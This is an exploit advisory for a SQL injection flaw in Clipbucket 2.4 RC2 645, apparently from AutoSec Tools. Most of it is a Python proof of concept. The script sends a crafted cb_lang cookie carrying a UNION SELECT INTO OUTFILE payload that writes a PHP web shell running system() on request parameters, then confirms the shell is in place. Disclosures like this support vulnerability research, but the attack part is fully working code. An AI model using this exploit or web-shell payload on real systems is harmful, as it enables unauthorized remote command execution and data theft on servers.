# Software................Clipbucket 2.4 RC2 645
# Vulnerability...........SQL Injection
# Threat Level............Critical (4/5)
# Download................http://www.clip-bucket.com/
# Discovery Date..........5/23/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
#
#
# --Description--
#
# A sql injection vulnerability in Clipbucket 2.4 RC2 645 can be
# exploited to extract arbitrary data. In some environments it may be
# possible to create a PHP shell.
#
#
# --PoC--
 
import socket
 
host = &#039;localhost&#039;
path = &#039;/clipbucket&#039;
shell_path = &#039;/shell.php&#039;
port = 80
 
def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)   
 
    s.send(&#039;POST &#039; + path + &#039;/includes/common.php HTTP/1.1\r\n&#039;
           &#039;Host: localhost\r\n&#039;
           &#039;Connection: keep-alive\r\n&#039;
           &#039;User-Agent: x\r\n&#039;
           &#039;Content-Length: 0\r\n&#039;
           &#039;Cache-Control: max-age=0\r\n&#039;
           &#039;Origin: null\r\n&#039;
           &#039;Content-Type: multipart/form-data; boundary=----x\r\n&#039;
           &#039;Cookie: cb_lang=\&#039;and%201=0%20UNION%20SELECT%20\&#039;%3C?php%20echo%20system($_GET[%22CMD%22])%3b%20?%3E\&#039;,\&#039;\&#039;,\&#039;\&#039;,\&#039;\&#039;,\&#039;\&#039;,\&#039;\&#039;%20FROM%20dual%20INTO%20OUTFILE%20\&#039;../../htdocs/shell.php\&#039;%3b%23; sess_salt=1testab\&#039;testxy\r\n&#039;
           &#039;Accept: text/html\r\n&#039;
           &#039;Accept-Language: en-US,en;q=0.8\r\n&#039;
           &#039;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n&#039;
           &#039;\r\n&#039;)
 
    resp = s.recv(8192)
 
    http_ok = &#039;HTTP/1.1 200 OK&#039;
     
    if http_ok not in resp[:len(http_ok)]:
        print &#039;error uploading shell&#039;
        return
    else: print &#039;shell uploaded&#039;
 
    s.send(&#039;GET &#039; + shell_path + &#039; HTTP/1.1\r\n&#039;\
           &#039;Host: &#039; + host + &#039;\r\n\r\n&#039;)
 
    if http_ok not in s.recv(8192)[:len(http_ok)]: print &#039;shell not found&#039;       
    else: print &#039;shell located at http://&#039; + host + shell_path
 
upload_shell()



